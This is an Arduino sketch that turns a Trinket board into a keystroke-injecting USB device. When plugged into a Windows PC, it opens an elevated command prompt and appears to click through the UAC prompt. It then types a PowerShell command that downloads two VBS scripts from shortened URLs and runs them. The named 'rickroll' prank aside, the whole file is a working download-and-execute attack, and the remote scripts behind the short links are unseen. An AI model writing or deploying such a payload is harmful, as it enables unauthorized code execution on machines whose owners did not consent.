#include <TrinketKeyboard.h>

void setup() {
  TrinketKeyboard.begin();
  delay(2000);
  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
  delay(10);
  TrinketKeyboard.pressKey(0, 0);
  delay(200);
  TrinketKeyboard.print("cmd");
  TrinketKeyboard.pressKey(KEYCODE_LEFT_SHIFT, KEYCODE_LEFT_CONTROL, 0x28);
  delay(5);
  TrinketKeyboard.pressKey(0, 0);
  delay(3000);
  TrinketKeyboard.pressKey(0, KEYCODE_ARROW_LEFT);
  delay(5);
  TrinketKeyboard.pressKey(0, 0);
  TrinketKeyboard.pressKey(0, 0x28);
  delay(5);
  TrinketKeyboard.pressKey(0, 0);
  delay(500);
  TrinketKeyboard.print("powershell (new-object System.Net.WebClient)");
  TrinketKeyboard.print(".DownloadFile('https://tinyurl.com/4w7h9ewc',");
  TrinketKeyboard.print("'%userprofile%\\rickroll.vbs'); ");
  TrinketKeyboard.print("&& start %userprofile%\\rickroll.vbs ");
  TrinketKeyboard.print("&& powershell (new-object System.Net.WebClient)");
  TrinketKeyboard.print(".DownloadFile('https://tinyurl.com/559b5rr3',");
  TrinketKeyboard.print("'%userprofile%\\volup.vbs'); ");
  TrinketKeyboard.print("&& start %userprofile%\\volup.vbs && exit");
  TrinketKeyboard.pressKey(0, 0x28);
  delay(5);
  TrinketKeyboard.pressKey(0, 0);
}

void loop() {

}
